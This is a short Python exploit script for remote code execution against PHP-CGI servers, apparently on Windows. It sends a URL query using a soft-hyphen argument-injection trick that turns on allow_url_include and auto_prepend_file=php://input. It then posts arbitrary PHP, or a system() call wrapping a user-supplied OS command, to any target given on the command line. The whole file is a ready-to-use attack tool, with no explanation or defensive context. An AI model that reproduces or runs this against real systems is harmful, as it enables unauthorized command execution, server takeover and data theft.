import requests
import argparse

parser = argparse.ArgumentParser(usage="""python exploit.py -t http://127.0.0.1 -c calc""")
parser.add_argument('--target', '-t', dest='target', help='Target URL', required=True)
parser.add_argument('--code', '-c', dest='code', help='OS command to execute', required=False)
parser.add_argument('--php', '-p', dest='php', help='PHP command to execute', required=False)
args = parser.parse_args()

url = args.target.rstrip('/') + "?%ADd+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input"

if not args.code and not args.php:
    print("[-] Either a PHP code or a Windows OS command should be provided.")
    exit(0)

if args.code:
    payload=f"<?php system('{args.code}')?>;"
elif args.php:
    payload=args.php

res = requests.post(url, data=payload)

if res.status_code == 200:
    print('(+) Request sent successful.')
else:
    print('(!) Request may have not sent successfully.')
